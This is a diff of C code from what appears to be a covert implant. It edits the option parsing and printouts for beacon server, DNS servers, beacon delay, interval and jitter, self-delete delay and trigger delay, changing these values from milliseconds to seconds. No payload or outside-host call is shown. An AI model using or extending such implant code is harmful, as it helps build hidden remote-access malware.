@@ -188,12 +188,12 @@ int main(int argc, char** argv)
 		printf("\t%32s: %-d\n", "Beacon Server Port number", args.beacon_port);
 		printf("\t%32s: %-s\n", "Primary DNS Server IP address", args.dns[0]);
 		printf("\t%32s: %-s\n", "Secondary DNS Server IP address", args.dns[1]);
-		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay / 1000);
-		printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval / 1000);
+		printf("\t%32s: %-lu\n", "Beacon Initial Delay (sec)", args.init_delay);
+		printf("\t%32s: %-d\n", "Beacon Interval (sec)", args.interval);
 		printf("\t%32s: %-d\n", "Beacon Jitter (%)", args.jitter);
 		printf("\t%32s: %-lu\n", "Self Delete Delay (sec)", args.delete_delay);
 		printf("\t%32s: %-s\n", "Self Delete Control File Path", sdpath);
-		printf("\t%32s: %-d\n\n", "Trigger Delay (+/-30 sec)", args.trigger_delay / 1000);
+		printf("\t%32s: %-d\n\n", "Trigger Delay (+/-30 sec)", args.trigger_delay);
 #endif
 
 		goto patched_binary;
@@ -224,14 +224,12 @@ int main(int argc, char** argv)
 #endif
 
 			case 'd':
-				// user enters delay in seconds and this is converted to milliseconds
 				// If set to 0, this will disable all beacons...
-				beaconInfo.initDelay = strtoul(optarg, NULL, 0) * 1000;
+				beaconInfo.initDelay = strtoul(optarg, NULL, 0);
 				break;
 
 			case 'i':
-				// user enters delay in seconds and this is converted to milliseconds
-				beaconInfo.interval = atoi(optarg) * 1000;
+				beaconInfo.interval = atoi(optarg);
 				break;
 
 			case 'j':
@@ -340,14 +338,11 @@ int main(int argc, char** argv)
 				break;
 
 			case 's':
-				// user enters self delete delay in seconds, this is NOT converted to milliseconds since Sleep is not used...
-				//delete_delay = atoi(optarg);
 				delete_delay =  strtoul(optarg, NULL, 10);
 				break;
 
 			case 't':
-				// user enters delay in seconds and this is converted to milliseconds
-				trigger_delay = atoi(optarg) * 1000;
+				trigger_delay = atoi(optarg);
 				break;
 
 			default:
@@ -442,8 +437,8 @@ patched_binary:	// Parsing of command line arguments skipped for patched binarie
 	printf("\t%32s: %-d\n", "Beacon Server Port", beaconInfo.port);
 	printf("\t%32s: %-s\n", "Primary DNS Server IP Address", beaconInfo.dns[0]);
 	printf("\t%32s: %-s\n", "Secondary DNS Server IP Address", beaconInfo.dns[1]);
-	printf("\t%32s: %-lu\n", "Initial Beacon Delay (sec)", beaconInfo.initDelay/1000);
-	printf("\t%32s: %-i\n", "Beacon Interval (sec)", beaconInfo.interval/1000);
+	printf("\t%32s: %-lu\n", "Initial Beacon Delay (sec)", beaconInfo.initDelay);
+	printf("\t%32s: %-i\n", "Beacon Interval (sec)", beaconInfo.interval);
 	printf("\t%32s: %-f\n\n", "Beacon Variance (%)", beaconInfo.percentVariance);
 #endif
 
